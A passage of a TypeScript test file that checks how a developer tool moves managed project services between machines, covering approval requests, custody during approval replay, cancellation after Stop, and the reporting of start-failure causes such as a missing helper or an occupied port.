                const read = ArtifactReadBatchHttpInputV1Schema.parse(body);
                const items = read.artifactIds.map(artifactId => {
                    if (!artifact || artifact.id !== artifactId) return { artifactId, ok: false as const,
                        error: 'artifact_not_found' as const, status: 404 as const, retryable: false };
                    const { body: _body, ...header } = artifact;
                    return 'projection' in read ? { artifactId, ok: true as const, artifact: header }
                        : { artifactId, ok: true as const, artifact, recipientCensus: null };
                });
                return { status: 200, data: 'projection' in read
                    ? ArtifactReadHeadersBatchResponseV1Schema.parse({ projection: 'headers', items })
                    : ArtifactReadBatchResponseV1Schema.parse({ items }) };
            }
            if (path === '/v1/artifacts') {
                const input = readCarrierMutation(body);
                artifact = { id: input.id, header: input.header, body: input.body, dataEncryptionKey: input.dataEncryptionKey,
                    ownerAccountId: 'owner', access: 'owner', encryptionMode: 'plain', publicAudience: 'none',
                    headerVersion: 1, bodyVersion: 1, seq: 1, createdAt: 1, updatedAt: 1 };
                return { status: 200, data: { id: input.id, headerVersion: 1, bodyVersion: 1 } };
            }
            if (artifact && path === `/v1/artifacts/${artifact.id}`) {
                const input = readCarrierMutation(body);
                expect(input).toMatchObject({ expectedHeaderVersion: artifact.headerVersion, expectedBodyVersion: artifact.bodyVersion });
                artifact = { ...artifact, header: input.header, body: input.body,
                    headerVersion: Number(artifact.headerVersion) + 1, bodyVersion: Number(artifact.bodyVersion) + 1 };
                return { status: 200, data: { success: true, headerVersion: artifact.headerVersion, bodyVersion: artifact.bodyVersion } };
            }
            return await priorPost(url, body, options);
        });
        const store = createCliApprovalsArtifactStore({ credentials: f.runtime.credentials!, serverId: 'home', getAccountEncryptionMode: async () => 'plain' });
        const proposalExecutor = options?.executor ?? createActionExecutor({ ...createUnavailableActionTransportDeps(), ...store });
        const proposal = await proposalExecutor.execute('projects.service.relocate', request, {
            ...f.context, surface: 'cli', runtimeAccountId: 'owner', executionRunTargetMachineId: f.workspace.machineId,
            machineAdmission: { ...f.ingress.machineAdmission!, machineId: f.workspace.machineId, installationId: 'source-installation' },
            verifyMachineAdmissionCurrent: f.ingress.verifyMachineAdmissionCurrent,
            actionsSettings: normalizeActionsSettingsV1({ v: 1, actions: {
                'projects.service.relocate': { approvalRequiredSurfaces: ['cli'] },
            } }),
        });
        if (!proposal.ok) throw new Error(JSON.stringify(proposal));
        expect(proposal).toMatchObject({ ok: true, result: { kind: 'approval_request_created' } });
        if (!proposal.ok || !proposal.result || typeof proposal.result !== 'object'
            || !('artifactId' in proposal.result)) throw new Error('Move approval was not recorded');
        const artifactId = String(proposal.result.artifactId);
        const open = ApprovalRequestV2Schema.parse(await store.approvalsGet({ artifactId, serverId: 'home' }));
        expect(open).toMatchObject({ status: 'open', requestedSurface: 'cli', actionArgs: request });
        expect(open.executionOriginV1.machineId).toBe(f.workspace.machineId);
        expect(open.actionArgs).toMatchObject({ setupReview: { reviewedEffectDigest: expect.any(String) } });
        if (options.setup) expect(open.preview).toMatchObject({ hostReviewedChildren: {
            children: expect.arrayContaining([expect.objectContaining({ action: 'projects.prepare', role: 'service.setup' })]),
        } });
        options.onOpen(artifactId, () => store.approvalsGet({ artifactId, serverId: 'home' }));
        return { authority: 'present_user' as const };
    }

    it('retains confirmed Stop and the incumbent binding through installed Move operation wiring when cancelled after Stop', async () => {
        const f = await fixture(false, undefined, true, 'portable');
        const review = await f.selectStart();
        const started = await f.routes.startTarget!({ ...f.request, expectedEffectDigest: review.reviewedEffectDigest }, f.ingress, f.context);
        if (started.status !== 'succeeded' || !started.currentTarget) throw new Error(`Portable Service did not start: ${JSON.stringify(started)}`);
        expect(DaemonLocalServiceLauncherStartResponseV1Schema.safeParse(started).success).toBe(true);
        const copiesBeforeMove = f.copies();
        const old = f.owner.listProjectServices()[0]!;
        if (old.kind !== 'workspace') throw new Error('Expected workspace Service');
        expect(old.execution).toBe('portable');
        let content: WorkspaceExecutionConfigContentV1 | null = null;
        let revision = 0;
        // Account row persistence is a network boundary; canonical compare/rebase and Action dispatch stay real.
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            const path = new URL(String(config.url)).pathname;
            if (path === '/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            if (path === '/v1/projects/execution/config/read') return { status: 200, data: content
                ? { status: 'present', revision, content } : { status: 'absent' } };
            expect(path).toBe('/v1/projects/execution/config/mutate');
            const mutation = WorkspaceExecutionConfigMutationRequestV1Schema.parse(config.data);
            expect(mutation.expectedRevision).toBe(content ? revision : 'absent');
            content = mutation.content;
            return { status: 200, data: { status: 'updated', revision: ++revision, cursor: revision } };
        });
        const relocateService = createProjectServiceRelocationRoute({ serverBaseUrl: 'https://home.example',
            credentials: f.runtime.credentials!, projectManagedServices: f.owner, resolveWorkspaceSyncHandoffAdapter: () => null });
        const executor = createCliActionExecutor({ token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
            serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null,
            serverIdentityId: f.serverIdentityId, pluginActionExecutionOwner: 'current_process',
            runtimeActionMachineId: f.workspace.machineId,
            projectDefinitionAction: f.projectDefinitionActionFor(f.workspace),
            projectWorkerAction: serviceWorkerAction(f, f.workspace.machineId),
            accountServerActionDeps: createAccountServerActionDeps({ token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
                serverId: 'home', serverHttpBaseUrl: 'https://home.example' }),
            runtimeActionExecute: await f.createRuntimeActionExecutor(relocateService),
        });
        const cancellation = new AbortController();
        const phases: string[] = [];
        const operations = createHostActionOperationRuntime({ machineId: f.workspace.machineId,
            resolveAccountId: async () => 'owner', generateOperationId: () => 'move-progress' });
        const workspace = { serverId: f.workspace.serverId, refId: f.workspace.id };
        const destination = { kind: 'primary' as const };
        const request = { workspace, sourceMachineId: f.workspace.machineId, serviceName: 'worker', requestId: 'cancel-after-stop', currentTarget: started.currentTarget,
            destination, selectedTarget: { machineId: f.workspace.machineId }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent' as const, expected: { kind: 'absent' as const }, value: { runsOn: destination, unavailable: 'fail' as const } } };
        const approved = await approvedMoveContext(f, request);
        await operations.observeExecution({ actionId: 'projects.service.relocate', input: request,
            execute: context => executor.execute('projects.service.relocate', request, { ...f.context, ...context,
                ...approved,
                surface: 'cli',
                signal: AbortSignal.any([context.signal, cancellation.signal]), operationProgress: { update(update) {
                    context.operationProgress.update(update);
                    if (update.phase) phases.push(update.phase);
                    if (update.phase === 'stopped') cancellation.abort();
                } } }),
        });
        const settled = await operations.runner.waitForTerminal({ accountId: 'owner', machineId: f.workspace.machineId }, 'move-progress');
        expect(old.snapshot().state, JSON.stringify(settled)).toBe('stopped');
        expect(phases).toEqual(['stopping', 'stopped']);
        expect(settled).toMatchObject({ state: 'cancelled', progress: { phase: 'stopped' }, domainRef: {
            kind: 'projectService', purpose: 'relocation', currentTarget: started.currentTarget,
            workspace: { machineId: f.targetWorkspace.machineId, workspaceId: f.targetWorkspace.id, rootPath: f.targetRoot },
        } });
        expect(f.copies()).toBe(copiesBeforeMove);
        expect(f.owner.listProjectServices()).toHaveLength(0);
    });

    it.each([['unbound', false], ['source-bound', false], ['unbound', true]] as const)('retains SOURCE custody during durable Move approval replay (%s decider, setup=%s)', async (binding, setup) => {
        const f = await fixture(setup, undefined, true, 'portable');
        const started = await seedWorkerService(f, f.workspace);
        if (setup) await rm(join(f.targetRoot, '.happier/project.json'));
        const old = f.owner.listProjectServices()[0]!;
        const phases: string[] = [];
        const workerAction = (machineId: string) => createProjectWorkerAction({ machineId, serverId: 'home',
            serverHttpBaseUrl: 'https://home.example', credentials: f.runtime.credentials!, accountId: 'owner',
            admission: createProjectWorkerAdmission({ machineId, admissionDrain: createDaemonAdmissionDrain(),
                readPolicy: async () => ({ status: 'ready', policy: { accepting: true, runAtMost: null }, source: 'stored', metadataVersion: 1 }) }),
            isFiniteExecutionLive: () => true, isServiceExecutionLive: () => true });
        const common = { token: f.runtime.credentials!.token, credentials: f.runtime.credentials!, serverId: 'home', serverIdentityId: f.serverIdentityId,
            serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain' as const, ctx: null,
            // Installed-host lifetime is an environment boundary; replay still
            // validates the real Artifact and its unchanged invocation origin.
            isApprovalExecutionOriginCurrent: async ({ origin, signal }: Parameters<NonNullable<import('@happier-dev/protocol/actions/executor/types').ActionExecutorDeps['isApprovalExecutionOriginCurrent']>>[0]) =>
                !signal?.aborted && origin.accountId === 'owner' && origin.serverId === 'home',
            pluginActionExecutionOwner: 'current_process' as const };
        const worker = createCliActionExecutor({ ...common, runtimeActionMachineId: f.targetWorkspace.machineId,
            projectWorkerAction: workerAction(f.targetWorkspace.machineId) });
        let statusRequests = 0;
        const readWorkerStatus = async (request: unknown, signal?: AbortSignal) => {
            const input = getActionSpec('projects.worker.status').inputSchema.parse(request);
            const result = await worker.execute('projects.worker.status', input, { ...f.context, surface: 'rpc',
                runtimeAccountId: 'owner', externalActionTarget: { kind: 'machine', machineId: f.targetWorkspace.machineId },
                ...(signal ? { signal } : {}) });
            expect(result).toMatchObject({ ok: true, result: { eligible: true, candidate: { machineId: f.targetWorkspace.machineId } } });
            if (!result.ok) throw new Error('Destination status refused');
            assertActionOutputContract('projects.worker.status', result.result);
            statusRequests++;
            return result.result;
        };
        f.bindWorkerStatusTransport((envelope, signal) => readWorkerStatus(envelope.input, signal));
        const syncObservation = { statuses: [{ relationshipId: 'source-worker', controllerMachineId: f.workspace.machineId,
            state: 'watching', alphaPath: f.root, betaPath: f.targetRoot, mode: 'keep_synced',
            endpointStates: { alpha: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 },
                beta: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 } },
            conflictCount: 0, lastCycleObservedAtMs: null }] };
        // Machine transport is the boundary. Both installed executors, status producers,
        // SOURCE coordinator, native custody, row readers and strict codecs stay real.
        vi.spyOn(machineRpcBoundary, 'callExactMachineRpc').mockImplementation(async call => {
            if (call.method === RPC_METHODS.DAEMON_WORKSPACE_SYNC_LIST) return syncObservation;
            expect(call.machineId).toBe(f.targetWorkspace.machineId);
            expect(call.method).toBe(getActionSpec('projects.worker.status').bindings!.rpcMethod);
            expect(call.credentials.token).toBe(f.runtime.credentials!.token);
            return await readWorkerStatus(call.request, call.signal);
        });
        // Selection requires an active native copy; the network observation is real-schema input.
        vi.spyOn(machineRpcBoundary, 'callMachineRpc').mockImplementation(async call => {
            expect(call.method).toBe(RPC_METHODS.DAEMON_WORKSPACE_SYNC_LIST);
            return syncObservation;
        });
        let content: WorkspaceExecutionConfigContentV1 | null = null;
        let revision = 0;
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            const path = new URL(String(config.url)).pathname;
            if (path === '/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            if (path === '/v1/projects/execution/config/read') return { status: 200, data: content
                ? { status: 'present', revision, content } : { status: 'absent' } };
            expect(path).toBe('/v1/projects/execution/config/mutate');
            content = WorkspaceExecutionConfigMutationRequestV1Schema.parse(config.data).content;
            return { status: 200, data: { status: 'updated', revision: ++revision, cursor: revision } };
        });
        const source = createCliActionExecutor({ ...common, runtimeActionMachineId: f.workspace.machineId,
            projectDefinitionAction: f.projectDefinitionActionFor(f.workspace),
            projectWorkerAction: workerAction(f.workspace.machineId),
            accountServerActionDeps: createAccountServerActionDeps(common),
            runtimeActionExecute: await f.createRuntimeActionExecutor(createProjectServiceRelocationRoute({
                serverBaseUrl: 'https://home.example', credentials: f.runtime.credentials!, projectManagedServices: f.owner,
                resolveWorkspaceSyncHandoffAdapter: () => null })) });
        const workspace = { serverId: 'home', refId: f.workspace.id };
        const destination = { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: f.targetWorkspace.machineId } };
        const request = { workspace, sourceMachineId: f.workspace.machineId, serviceName: 'worker', requestId: 'source-to-worker', currentTarget: started.currentTarget,
            destination, selectedTarget: { machineId: f.targetWorkspace.machineId }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent' as const, expected: { kind: 'absent' as const }, value: { runsOn: destination, unavailable: 'fail' as const } } };
        const graphReadCount = () => f.post.mock.calls.filter(([url, body]) =>
            String(url).endsWith('/list') && typeof body === 'object' && body !== null
            && 'kinds' in body && Array.isArray(body.kinds) && body.kinds.includes('relationship-graph')).length;
        const graphReadsBefore = graphReadCount();
        const review: { current?: { artifactId: string; readApproval: () => Promise<unknown> } } = {};
        await approvedMoveContext(f, request, { executor: source, ...(setup ? { setup: true } : {}),
            onOpen: (artifactId, readApproval) => { review.current = { artifactId, readApproval }; } });
        if (!review.current) throw new Error('Missing open Move review');
        const proposalGraphReads = graphReadCount() - graphReadsBefore;
        expect(proposalGraphReads).toBeGreaterThan(0);
        const executionContext = { ...f.context, authority: 'present_user' as const, runtimeAccountId: 'owner',
            machineAdmission: { ...f.ingress.machineAdmission!, machineId: f.workspace.machineId, installationId: 'source-installation' },
            verifyMachineAdmissionCurrent: f.ingress.verifyMachineAdmissionCurrent,
            surface: 'cli', ...(binding === 'source-bound' ? { externalActionTarget: { kind: 'machine' as const, machineId: f.workspace.machineId } } : {}),
            operationProgress: { update(update) {
                if (update.phase) phases.push(update.phase);
            } } } satisfies Parameters<typeof source.execute>[2];
        const decision = await source.execute('approval.request.decide', { artifactId: review.current.artifactId, decision: 'approve' }, executionContext);
        expect(decision, JSON.stringify(decision)).toMatchObject({ ok: true });
        const result = ApprovalRequestV2Schema.parse(await review.current.readApproval()).execution;
        // Machine-placed Move replay retains its originating SOURCE custody.
        // The deciding context cannot grant a cross-Machine worker child.
        expect(result, JSON.stringify({ result, phases,
            origin: ApprovalRequestV2Schema.parse(await review.current.readApproval()).executionOriginV1 })).toMatchObject({ ok: false,
            errorCode: 'target_not_local' });
        expect(statusRequests).toBe(0);
        expect(phases).toEqual([]);
        expect(old.snapshot().state).toBe('running');
        // Ask preparation selects the exact native operands. The coordinator
        // then reads the current route once before refusing the worker child.
        expect(graphReadCount() - graphReadsBefore).toBe(proposalGraphReads + 1);
        expect(f.copies()).toBe(0);
    });

    it.each(['confirmed', 'unknown', 'unsupported', 'stale', 'primary', 'missing'] as const)(
        'coordinates a distinct worker incumbent from SOURCE through installed canonical read/Stop (%s)', async outcome => {
        const f = await fixture(false, undefined, true, 'portable');
        const started = await seedWorkerService(f);
        const old = f.owner.listProjectServices()[0]!;
        const sourceOwner = createManagedServicesOwner({ processSupervisorHost: createManagedServiceProcessSupervisorHost({ custodyOwner: 'daemon' }),
            dependencies: Object.freeze({}) as never, resolveScope: scope => scope });
        cleanups.push(() => sourceOwner.dispose());
        const actions = createLocalServiceActionRoutes({ machineId: f.targetWorkspace.machineId, projectManagedServices: f.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(),
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const nativeRuntime = await f.createRuntimeActionExecutor(undefined, actions);
        const nativeParams = { token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
            serverId: 'home', serverIdentityId: f.serverIdentityId, serverHttpBaseUrl: 'https://home.example',
            sessionId: 'cli-global', mode: 'plain' as const, ctx: null, runtimeActionMachineId: f.targetWorkspace.machineId,
            pluginActionExecutionOwner: 'current_process' as const, runtimeActionExecute: nativeRuntime };
        const nativeExecutor = createCliActionExecutor(nativeParams);
        const workerRpc = new RpcHandlerManager({ scopePrefix: f.targetWorkspace.machineId,
            localMachineId: f.targetWorkspace.machineId, encryptionMode: 'plain' });
        registerDaemonLocalServicesMachineRpcHandlers(workerRpc, { machineId: f.targetWorkspace.machineId, serverId: 'home',
            localServicesLauncher: f.routes, localServicesActions: actions,
            resolveLauncherActionExecutor: () => nativeExecutor });
        const cancellation = new AbortController();
        let stopRequests = 0;
        const priorGet = vi.mocked(axios.get).getMockImplementation()!;
        vi.mocked(axios.get).mockImplementation(async (url, options) => {
            const path = new URL(String(url)).pathname;
            if (path.startsWith('/v1/artifacts/')) return { status: 404, data: { error: 'artifact_not_found' } };
            return priorGet(url, options);
        });
        // Exact Machine transport is the boundary. Registered handlers, policy, feed and native custody stay real.
        vi.spyOn(machineRpcBoundary, 'callExactMachineRpc').mockImplementation(async request => {
            expect(request.machineId).toBe(f.targetWorkspace.machineId);
            expect(request.credentials.token).toBe(f.runtime.credentials!.token);
            expect(f.copies()).toBe(0);
            if (request.method === RPC_METHODS.DAEMON_LOCAL_SERVICES_LAUNCHER_SNAPSHOT) {
                expect(request.request).toMatchObject({ projection: 'managed_bindings', scope: 'workspace', workspaceRoot: f.targetRoot });
                const response = DaemonLocalServiceLauncherSnapshotResponseV1Schema.parse(await workerRpc.invokeLocal(request.method,
                    request.request, { ...f.ingress, signal: request.signal ?? f.ingress.signal, localActionContext: f.context }));
                assertActionOutputContract('localServices.launcher.snapshot', response.snapshot);
                // Primary and omitted transport facts must never grant portability; the native owner stays real.
                if (outcome === 'primary' || outcome === 'missing') return { ...response, snapshot: { ...response.snapshot,
                    targets: response.snapshot.targets.map(target => { const { execution: _execution, ...rest } = target;
                        return outcome === 'primary' ? { ...rest, execution: 'primary' } : rest; }) } };
                expect(response.snapshot.targets).toEqual([expect.objectContaining({ execution: 'portable' })]);
                return response;
            }
            throw new Error(`Unexpected raw Machine method: ${request.method}`);
        });
        const priorPost = f.post.getMockImplementation()!;
        f.post.mockImplementation(async (url, body, options) => {
            const actionId = 'localServices.actions.stopManaged';
            const path = new URL(String(url)).pathname;
            if (path === bindExternalActionExecutionAuthorizationVerifyHttpPathV1(actionId)) {
                ExternalActionExecutionAuthorizationVerifyRequestV1Schema.parse(body);
                return { status: 200, data: { ok: true } };
            }
            if (path !== bindExternalActionExecutionAuthorizationHttpPathV1(actionId) && path !== `/v1/actions/${actionId}`) {
                return priorPost(url, body, options);
            }
            expect(options?.headers).toMatchObject({ Authorization: `Bearer ${f.runtime.credentials!.token}` });
            const request = ExternalActionExecutionAuthorizationRequestV1Schema.parse(body);
            const envelope = ExternalActionRequestEnvelopeV1Schema.parse(request.envelope);
            expect(envelope.target).toEqual({ kind: 'machine', machineId: f.targetWorkspace.machineId });
            const stop = LocalServiceActionRequestV1Schema.parse(envelope.input);
            expect(stop).toMatchObject({ target: started.currentTarget, action: 'stop_managed' });
            const authorization = ExternalActionExecutionAuthorizationV1Schema.parse({ v: 1, token: 'home-issued-incumbent-stop', binding: {
                accountId: 'owner', custodianAccountId: 'owner', authentication: { kind: 'terminal', tokenEpoch: 1 },
                accountEncryptionMode: 'plain', serverIdentityId: f.serverIdentityId, machineId: f.targetWorkspace.machineId,
                installationId: f.ingress.machineAdmission!.installationId, actionId, requestId: envelope.requestId,
                target: envelope.target, requestEnvelopeDigest: computeExternalActionRequestEnvelopeDigestV1(envelope),
            } });
            if (path === bindExternalActionExecutionAuthorizationHttpPathV1(actionId)) return { status: 200, data: authorization };
            expect(request.executionAuthorization?.binding).toEqual(authorization.binding);
            const installationPrivateKey = f.machineInstallationKeys.get(f.targetWorkspace.machineId)!;
            const opened = openExternalActionRequesterAccountContextV1({ authorization: request.executionAuthorization,
                purpose: { kind: 'external_action' }, machineId: f.targetWorkspace.machineId,
                installationId: f.ingress.machineAdmission!.installationId, serverIdentityId: f.serverIdentityId,
                installationPrivateKey, includeInvocation: true });
            expect(opened?.invocation?.reviewedParent?.actionId).toBe('projects.service.relocate');
            // Original host Stop is admitted by Home before its native effect;
            // acknowledgement loss and unsupported custody belong to this hop.
            stopRequests++;
            if (outcome === 'unknown') throw new Error('Transport acknowledgement unavailable');
            if (outcome === 'unsupported') return { status: 200, data: ExternalActionResponseEnvelopeV1Schema.parse({ v: 1,
                actionId, requestId: envelope.requestId, execution: { ok: true, result: {
                    v: 1, requestId: stop.requestId, action: 'stop_managed', status: 'denied',
                    reasonCode: 'service_control_unsupported', auditEvents: [],
                } } }) };
            const signal = options?.signal instanceof AbortSignal ? options.signal : f.ingress.signal;
            const response = await executeExternalAction({ actionId, envelope, executionAuthorization: request.executionAuthorization!,
                principal: { accountId: 'owner', authority: 'account_automation', authentication: { kind: 'terminal', tokenEpoch: 1 } },
                currentMachineId: f.targetWorkspace.machineId, currentServerId: 'home', currentAccountId: 'owner',
                currentServerHttpBaseUrl: 'https://home.example', currentInstallationId: f.ingress.machineAdmission!.installationId,
                externalActionMachineRequestPrivateKey: installationPrivateKey, machineAdmission: f.ingress.machineAdmission,
                verifyExecutionAuthorization: async ({ authorization: supplied }) => supplied.token === authorization.token
                    && JSON.stringify(supplied.binding) === JSON.stringify(authorization.binding),
                resolveTarget: async ({ target }) => target ?? null, executor: nativeExecutor,
                prepareRequesterAccountContext: args => prepareRequesterAccountActionContext({ ...args, purpose: { kind: 'external_action' },
                    machineId: f.targetWorkspace.machineId, installationId: f.ingress.machineAdmission!.installationId,
                    installationPrivateKey, serverId: 'home', serverIdentityId: f.serverIdentityId, serverHttpBaseUrl: 'https://home.example',
                    ownCredentials: f.runtime.credentials!, isCurrent: async () => !signal.aborted,
                    createExecutor: admitted => createCliActionExecutor({ ...nativeParams,
                        token: admitted.credentials.token, credentials: admitted.credentials,
                        actionsSettingsProvider: createSnapshotActionSettingsProvider(() => {
                            const snapshot = admitted.savedSecretOperationContext.readSnapshot();
                            if (!snapshot) throw new Error('Requester Account custody retired');
                            return snapshot;
                        }) }) }), signal });
            expect(response, JSON.stringify(response)).toMatchObject({ kind: 'response' });
            if (response.kind !== 'response') throw new Error(`Stop receiver refused: ${response.errorCode}`);
            expect(old.snapshot().state).toBe('stopped');
            return { status: 200, data: response.response };
        });
        let content: WorkspaceExecutionConfigContentV1 | null = null;
        let revision = 0;
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            const path = new URL(String(config.url)).pathname;
            if (path === AUTOMATION_ACTION_INDEX_HTTP_PATH_V1) return { status: 200, data: ActionAutomationIndexV1Schema.parse({ v: 1, rows: [] }) };
            if (path === '/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            if (path === '/v1/projects/execution/config/read') return { status: 200, data: content
                ? { status: 'present', revision, content } : { status: 'absent' } };
            expect(path).toBe('/v1/projects/execution/config/mutate');
            content = WorkspaceExecutionConfigMutationRequestV1Schema.parse(config.data).content;
            return { status: 200, data: { status: 'updated', revision: ++revision, cursor: revision } };
        });
        reconnectCliActionAutomationsV1({ token: f.runtime.credentials!.token, serverHttpBaseUrl: 'https://home.example' });
        const relocate = createProjectServiceRelocationRoute({ serverBaseUrl: 'https://home.example', credentials: f.runtime.credentials!,
            projectManagedServices: sourceOwner, resolveWorkspaceSyncHandoffAdapter: () => null });
        const sourceLauncher = createLocalServiceLauncherRoutes({ feed: createLocalServiceLauncherFeed({
            machineId: f.workspace.machineId, projectManagedServices: sourceOwner,
            inventoryRegistry: createLocalServiceInventoryRegistry(), previewRegistry: createLocalServicePreviewRegistry(),
        }) });
        const sourceRuntime = await f.createRuntimeActionExecutor(relocate, undefined, sourceLauncher);
        const sourceRpc = new RpcHandlerManager({ scopePrefix: f.workspace.machineId, localMachineId: f.workspace.machineId, encryptionMode: 'plain' });
        registerProjectDefinitionHandlers({ rpcHandlerManager: sourceRpc, machineId: f.workspace.machineId,
            actionExecutor: createCliActionExecutor({ token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
                serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null,
                serverIdentityId: f.serverIdentityId, runtimeActionMachineId: f.workspace.machineId,
                projectDefinitionAction: f.projectDefinitionActionFor(f.workspace) }) });
        const executor = createCliActionExecutor({ token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
            serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null,
            serverIdentityId: f.serverIdentityId, pluginActionExecutionOwner: 'current_process',
            runtimeActionMachineId: f.workspace.machineId,
            projectWorkerAction: serviceWorkerAction(f, f.workspace.machineId),
            machineActionDirectTargetTransport: { machineId: f.workspace.machineId,
                invoke: (method, request, options) => sourceRpc.invokeLocal(method, request, { ...f.ingress,
                    machineAdmission: { ...f.ingress.machineAdmission!, machineId: f.workspace.machineId, installationId: 'source-installation' },
                    signal: options?.signal ?? f.ingress.signal,
                    ...(options?.localActionContext ? { localActionContext: options.localActionContext } : {}) }) },
            accountServerActionDeps: createAccountServerActionDeps({ token: f.runtime.credentials!.token,
                credentials: f.runtime.credentials!, serverId: 'home', serverHttpBaseUrl: 'https://home.example' }),
            runtimeActionExecute: sourceRuntime });
        const workspace = { serverId: 'home', refId: f.workspace.id };
        const destination = { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: f.workspace.machineId } };
        const phases: string[] = [];
        const operations = createHostActionOperationRuntime({ machineId: f.workspace.machineId,
            resolveAccountId: async () => 'owner', generateOperationId: () => `remote-${outcome}` });
        const currentTarget = outcome === 'stale' ? { ...started.currentTarget, cwd: `${f.targetRoot}/changed` } : started.currentTarget;
        const request = { workspace, sourceMachineId: f.workspace.machineId, serviceName: 'worker',
            requestId: outcome === 'confirmed' || outcome === 'unknown'
                ? 'r'.repeat(ACTION_OPERATION_REQUEST_ID_MAX_LENGTH_V1) : `remote-${outcome}`, currentTarget,
            destination, selectedTarget: { machineId: f.workspace.machineId }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent' as const, expected: { kind: 'absent' as const }, value: { runsOn: destination, unavailable: 'fail' as const } } };
        const approved = await approvedMoveContext(f, request);
        let result: Awaited<ReturnType<typeof executor.execute>> | undefined;
        await operations.observeExecution({ actionId: 'projects.service.relocate', input: request, execute: async context => {
            result = await executor.execute('projects.service.relocate', request, { ...f.context, ...context,
                ...approved,
                surface: 'cli',
                signal: AbortSignal.any([context.signal, cancellation.signal]), operationProgress: { update(update) {
                    context.operationProgress.update(update);
                    if (update.phase) phases.push(update.phase);
                    if (update.phase === 'stopped') cancellation.abort();
                } } });
            return result;
        } });
        const settled = await operations.runner.waitForTerminal({ accountId: 'owner', machineId: f.workspace.machineId }, `remote-${outcome}`);
        const reason = { confirmed: 'cancelled', unknown: 'outcome_unknown', unsupported: 'service_control_unsupported',
            stale: 'service_inputs_changed', primary: 'primary_only', missing: 'service_execution_unavailable' }[outcome];
        expect(result).toMatchObject({ ok: false, errorCode: reason });
        expect(old.snapshot().state).toBe(outcome === 'confirmed' ? 'stopped' : 'running');
        expect(stopRequests).toBe(['confirmed', 'unknown', 'unsupported'].includes(outcome) ? 1 : 0);
        expect(f.copies()).toBe(0);
        expect(sourceOwner.listProjectServices()).toEqual([]);
        if (outcome === 'confirmed') {
            expect(phases).toEqual(['stopping', 'stopped']);
            expect(settled).toMatchObject({ state: 'cancelled', progress: { phase: 'stopped' }, domainRef: {
                currentTarget: started.currentTarget, workspace: { machineId: f.targetWorkspace.machineId, workspaceId: f.targetWorkspace.id } } });
        } else expect(phases).not.toContain('copying');
    });

    it('starts admitted Service work without deciding Ask again and still refuses a stale effect digest', async () => {
        const f = await fixture();
        const context = { ...f.context, surface: 'agent' as const };
        expect(await f.routes.startTarget!({ ...f.request, expectedEffectDigest: 'stale' }, f.ingress, context))
            .toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
        expect(f.owner.readResourceTargets()).toHaveLength(0);
        const started = await f.routes.startTarget!(f.request, f.ingress, context);
        expect(started).toMatchObject({ status: 'succeeded' });
        expect(f.owner.readResourceTargets()).toHaveLength(1);
    });

    it('retains the Project managed-service refusal reason through reviewed Start', async () => {
        const f = await fixture();
        const reviewed = await f.selectStart();
        if (!reviewed.reviewedEffectDigest) throw new Error('Missing service review');
        const executor = await f.createRuntimeActionExecutor();
        // Hide the staged helper at the filesystem boundary while keeping the
        // launcher, supervisor and Action store on their production paths.
        const exists = filesystemBoundary.existsSync;
        vi.spyOn(filesystemBoundary, 'existsSync').mockImplementation(path =>
            /[\\/]happier-process-custody(?:\.exe)?$/u.test(String(path)) ? false : exists(path));

        const result = DaemonLocalServiceLauncherStartResponseV1Schema.parse(await executor({
            actionId: 'localServices.launcher.start',
            input: { ...f.request, expectedEffectDigest: reviewed.reviewedEffectDigest },
            context: { ...f.context, actionRequestId: 'missing-service-output-helper-start' },
        }));
        assertActionOutputContract('localServices.launcher.start', result);
        const failureCause = {
            phase: 'managed_service.establishment', errorClass: 'Error',
            errorCode: 'plugin_managed_service_unavailable', httpStatus: null,
            nativeErrorReason: 'service_output_support_executable_missing',
        };
        expect(result).toMatchObject({ reasonCode: failureCause.errorCode, failureCause });
        expect(f.operationRuntime.store.list({ accountId: 'owner', machineId: f.targetWorkspace.machineId }).items
            .find(item => item.actionId === 'localServices.launcher.start')).toMatchObject({
                state: 'failed', error: { errorCode: failureCause.errorCode, failureCause },
            });
    });

    it('retains the real occupied-port establishment cause through declaration Start and its strict consumer', async () => {
        const listener = createServer();
        await new Promise<void>(resolve => listener.listen(0, '127.0.0.1', resolve));
        cleanups.push(async () => { if (listener.listening) {
            await new Promise<void>((resolve, reject) => listener.close(error => error ? reject(error) : resolve()));
        } });
        const address = listener.address();
        if (!address || typeof address === 'string') throw new Error('Missing fixture port');
        const script = `require('net').createServer().listen(${address.port}, '127.0.0.1')`;
        const f = await fixture(false, { kind: 'command', command: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(script)}` });
        await new Promise<void>((resolve, reject) => listener.close(error => error ? reject(error) : resolve()));
        const occupant = spawn(process.execPath, ['-e', `require('net').createServer().listen(${address.port}, '127.0.0.1', () => console.log('listening'))`],
            { cwd: f.root, stdio: ['ignore', 'pipe', 'pipe'] });
        cleanups.push(async () => {
            if (occupant.exitCode !== null || occupant.signalCode !== null) return;
            const exited = once(occupant, 'exit'); occupant.kill(); await exited;
        });
